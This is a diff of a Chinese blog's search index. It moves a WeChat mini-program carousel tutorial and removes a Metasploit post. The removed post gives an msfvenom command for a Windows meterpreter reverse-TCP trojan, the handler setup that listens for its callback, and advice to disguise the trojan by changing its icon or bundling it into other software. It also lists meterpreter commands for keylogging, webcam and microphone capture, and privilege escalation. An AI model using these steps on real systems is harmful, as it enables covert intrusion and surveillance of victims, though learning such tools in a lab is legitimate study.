-<h3 id="1-2-3-index-wxss"><a href="#1-2-3-index-wxss" class="headerlink" title="1.2.3 index.wxss"></a>1.2.3 index.wxss</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.index_swiper</span> &#123;</span><br><span class="line">    <span class="selector-tag">swiper</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">750</span>rpx;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">340</span>rpx;</span><br><span class="line"></span><br><span class="line">        <span class="selector-tag">image</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="2-导航条"><a href="#2-导航条" class="headerlink" title="2.导航条"></a>2.导航条</h1><h2 id="2-1-获取接口数据"><a href="#2-1-获取接口数据" class="headerlink" title="2.1 获取接口数据"></a>2.1 获取接口数据</h2><h2 id="2-2-页面布局"><a href="#2-2-页面布局" class="headerlink" title="2.2 页面布局"></a>2.2 页面布局</h2><h3 id="2-2-1-左右菜单"><a href="#2-2-1-左右菜单" class="headerlink" title="2.2.1 左右菜单"></a>2.2.1 左右菜单</h3><h3 id="2-2-2-点击效果"><a href="#2-2-2-点击效果" class="headerlink" title="2.2.2 点击效果"></a>2.2.2 点击效果</h3><h3 id="2-2-3-点击菜单切换内容"><a href="#2-2-3-点击菜单切换内容" class="headerlink" title="2.2.3 点击菜单切换内容"></a>2.2.3 点击菜单切换内容</h3><h2 id="2-3-商品列表Tabs组件"><a href="#2-3-商品列表Tabs组件" class="headerlink" title="2.3 商品列表Tabs组件"></a>2.3 商品列表Tabs组件</h2><h1 id="3-分类"><a href="#3-分类" class="headerlink" title="3.分类"></a>3.分类</h1><h1 id="4-购物车"><a href="#4-购物车" class="headerlink" title="4.购物车"></a>4.购物车</h1><h1 id="5-我的"><a href="#5-我的" class="headerlink" title="5.我的"></a>5.我的</h1>]]></content>
-      <categories>
-        <category>小程序</category>
-      </categories>
-      <tags>
-        <tag>小程序</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见的密码类型</title>
     <url>/post/ba5852c2.html</url>
     <content><![CDATA[<p>　　对Base家族密码类型做的一次总结<span id="more"></span></p>
@@ -3470,6 +3516,21 @@
       <categories>
         <category>网络安全知识学习</category>
       </categories>
+  </entry>
+  <entry>
+    <title>小程序开发</title>
+    <url>/post/8d10680e.html</url>
+    <content><![CDATA[<p>　　2020年寒假在培训的时候记录的小程序项目<span id="more"></span></p>
+<h1 id="1-首页"><a href="#1-首页" class="headerlink" title="1.首页"></a>1.首页</h1><h2 id="1-1-搜索框组件"><a href="#1-1-搜索框组件" class="headerlink" title="1.1 搜索框组件"></a>1.1 搜索框组件</h2><h2 id="1-2-轮播图"><a href="#1-2-轮播图" class="headerlink" title="1.2 轮播图"></a>1.2 轮播图</h2><h3 id="1-2-1-index-js"><a href="#1-2-1-index-js" class="headerlink" title="1.2.1 index.js"></a>1.2.1 index.js</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面开始加载，就会触发</span></span><br><span class="line">onLoad: <span class="function"><span class="keyword">function</span> (<span class="params">opitons</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1.发送异步请求获取轮播图数据</span></span><br><span class="line">  <span class="keyword">var</span> reqTask = wx.request(&#123;</span><br><span class="line">    url: <span class="string">&#x27;https://api-hmugo-web.itheima.net/api/public/v1/home/swiperdata&#x27;</span>,</span><br><span class="line">    success: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
+<h3 id="1-2-2-index-wxml"><a href="#1-2-2-index-wxml" class="headerlink" title="1.2.2 index.wxml"></a>1.2.2 index.wxml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 轮播图开始 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index_swiper&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">       1.swiper标签存在默认的宽度和高度    100% * 150px</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       2.image标签默认的高度和宽度     320px * 240px </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       3.设计图片和轮播图</span></span><br><span class="line"><span class="comment">           3.1 先看原图宽高    750 * 340</span></span><br><span class="line"><span class="comment">           3.2 让图片高度自适应    宽度等于100%</span></span><br><span class="line"><span class="comment">           3.3 让swiper标签的高度  变成和图片一样高</span></span><br><span class="line"><span class="comment">       4.图片标签</span></span><br><span class="line"><span class="comment">         mode属性 渲染模式</span></span><br><span class="line"><span class="comment">           widthFix 让图片的标签宽高和图片标签的内容的宽高都等比例发生变化</span></span><br><span class="line"><span class="comment">       --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">autoplay</span> <span class="attr">indicator-dots</span> <span class="attr">circular</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">swiper-item</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;swiperList&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;goods_id&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">navigator</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;item.image_src&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 轮播图结束 --&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="1-2-3-index-wxss"><a href="#1-2-3-index-wxss" class="headerlink" title="1.2.3 index.wxss"></a>1.2.3 index.wxss</h3><figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.index_swiper</span> &#123;</span><br><span class="line">    <span class="selector-tag">swiper</span> &#123;</span><br><span class="line">        <span class="attribute">width</span>: <span class="number">750</span>rpx;</span><br><span class="line">        <span class="attribute">height</span>: <span class="number">340</span>rpx;</span><br><span class="line"></span><br><span class="line">        <span class="selector-tag">image</span> &#123;</span><br><span class="line">            <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="2-导航条"><a href="#2-导航条" class="headerlink" title="2.导航条"></a>2.导航条</h1><h2 id="2-1-获取接口数据"><a href="#2-1-获取接口数据" class="headerlink" title="2.1 获取接口数据"></a>2.1 获取接口数据</h2><h2 id="2-2-页面布局"><a href="#2-2-页面布局" class="headerlink" title="2.2 页面布局"></a>2.2 页面布局</h2><h3 id="2-2-1-左右菜单"><a href="#2-2-1-左右菜单" class="headerlink" title="2.2.1 左右菜单"></a>2.2.1 左右菜单</h3><h3 id="2-2-2-点击效果"><a href="#2-2-2-点击效果" class="headerlink" title="2.2.2 点击效果"></a>2.2.2 点击效果</h3><h3 id="2-2-3-点击菜单切换内容"><a href="#2-2-3-点击菜单切换内容" class="headerlink" title="2.2.3 点击菜单切换内容"></a>2.2.3 点击菜单切换内容</h3><h2 id="2-3-商品列表Tabs组件"><a href="#2-3-商品列表Tabs组件" class="headerlink" title="2.3 商品列表Tabs组件"></a>2.3 商品列表Tabs组件</h2><h1 id="3-分类"><a href="#3-分类" class="headerlink" title="3.分类"></a>3.分类</h1><h1 id="4-购物车"><a href="#4-购物车" class="headerlink" title="4.购物车"></a>4.购物车</h1><h1 id="5-我的"><a href="#5-我的" class="headerlink" title="5.我的"></a>5.我的</h1>]]></content>
+      <categories>
+        <category>小程序</category>
+      </categories>
+      <tags>
+        <tag>小程序</tag>
+      </tags>
   </entry>
   <entry>
     <title>房租管理系统</title>
@@ -7449,66 +7510,5 @@ ASL=\sum_{i=1}^{n}p_ic_i</script><p>n：记录的个数</p>
       <categories>
         <category>课程</category>
       </categories>
-  </entry>
-  <entry>
-    <title>Kali使用msf演示</title>
-    <url>/post/4cf34f0f.html</url>
-    <content><![CDATA[<h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
-<p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
-<p>模块分为：</p>
-<p>辅助模块———————AUX</p>
-<p>渗透攻击模块————exploits</p>
-<p>后渗透攻击模块———post</p>
-<p>攻击载荷模块————-payloads</p>
-<p>编码器模块——————encoders</p>
-<p>空指令模块——————nops</p>
-<h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
-<li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
-<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
-</li>
-<li><p>常用命令</p>
-<p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
-<p>比如<code>search ms17_010</code>搜索这个漏洞</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
-<p>rank是等级，按可靠性降序排列</p>
-<p>excellent——-great—good—-normal—-average—-low—-manual</p>
-</li>
-</ol>
-<h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
-<li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
-</li>
-<li><p><code>msfconsole</code>打开msf</p>
-</li>
-<li><p>配置参数</p>
-<p>(1)命令： <code>use exploit/multi/handler</code>（选择模块）</p>
-<p>(2)命令： <code>set payload windows/meterpreter/reverse_tcp</code>（选择攻击模块）</p>
-<p>(3)命令： <code>set LhOST 192.168.32.1</code>（填写自己主机的IP地址）</p>
-<p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
-<p>(5)命令： <code>show options</code>（查看设置参数）</p>
-<p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
-</li>
-<li><p>在靶机打开可执行文件</p>
-<p>这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上</p>
-</li>
-<li><p>查看用户</p>
-<p>(1)命令：sessions（查看上钩用户）</p>
-<p>(2)命令：sessions -i 1（选择需要攻击的用户，这里选1）</p>
-<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
-<p>出现meterpreter就已经成功了</p>
-</li>
-<li><p>meterpreter入侵对方电脑的命令</p>
-<p>(1)监控对方电脑屏幕</p>
-<p><code>run vnc -i</code></p>
-<p>(2)更多命令</p>
-<blockquote>
-<p>cmd指令:<br>cat 读取文件内容到屏幕<br>cd 更改目录<br>checksum 检索文件的校验和<br>cp 将源复制到目标<br>del 删除指定文件<br>dir 列出文件（ls 的别名）<br>下载 下载文件或目录<br>编辑 编辑文件<br>getlwd 打印本地工作目录<br>getwd 打印工作目录<br>lcd 更改本地工作目录<br>lls 列出本地文件<br>lpwd 打印本地工作目录<br>ls 列出文件<br>mkdir 创建目录<br>mv 将源移动到目标<br>pwd 打印工作目录<br>rm 删除指定文件<br>rmdir 删除目录<br>search 搜索文件<br>show_mount 列出所有挂载点/逻辑驱动器<br>upload 上传文件或目录<br>pkill 按名称终止进程</p>
-<p>meterpreter命令：<br>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p>
-</blockquote>
-</li>
-</ol>
-]]></content>
   </entry>
 </search>
